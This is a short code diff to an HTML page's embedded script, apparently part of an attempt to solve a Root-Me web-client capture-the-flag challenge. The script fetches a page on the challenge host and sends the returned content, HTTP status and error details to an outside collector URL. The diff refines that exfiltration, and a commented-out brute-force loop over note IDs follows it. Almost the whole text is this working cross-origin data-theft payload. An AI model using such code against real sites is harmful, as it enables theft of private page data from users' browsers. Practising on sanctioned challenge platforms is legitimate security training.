@@ -4,16 +4,21 @@
 </head>
 <body>
 <script>
-    fetch('https://web-client-ch56.challenge01.root-me.org:58056/notes/2278')
+fetch('https://web-client-ch56.challenge01.root-me.org:58056/')
   .then(response => {
     if (!response.ok) {
-    fetch('https://rootmeleak2.free.beeceptor.com/' + response.status); // Use response.json() if the response is JSON
-
+      fetch(`https://rootmeleak2.free.beeceptor.com/error?status=${response.status}&statusText=${response.statusText}`);
+      throw new Error(`HTTP Error: ${response.status} - ${response.statusText}`);
     }
-    fetch('https://rootmeleak2.free.beeceptor.com/' + response.text()); // Use response.json() if the response is JSON
+    return response.text(); // Ensure we return the response text for the next .then()
   })
-  .then(data => fetch('https://rootmeleak2.free.beeceptor.com/' + data))
-  .catch(error => fetch('https://rootmeleak2.free.beeceptor.com/' + error));
+  .then(data => {
+    fetch(`https://rootmeleak2.free.beeceptor.com/data?content=${encodeURIComponent(data)}`);
+  })
+  .catch(error => {
+    fetch(`https://rootmeleak2.free.beeceptor.com/catch?message=${encodeURIComponent(error.message)}&stack=${encodeURIComponent(error.stack)}`);
+  });
+
 
     /*
     const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_', base = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
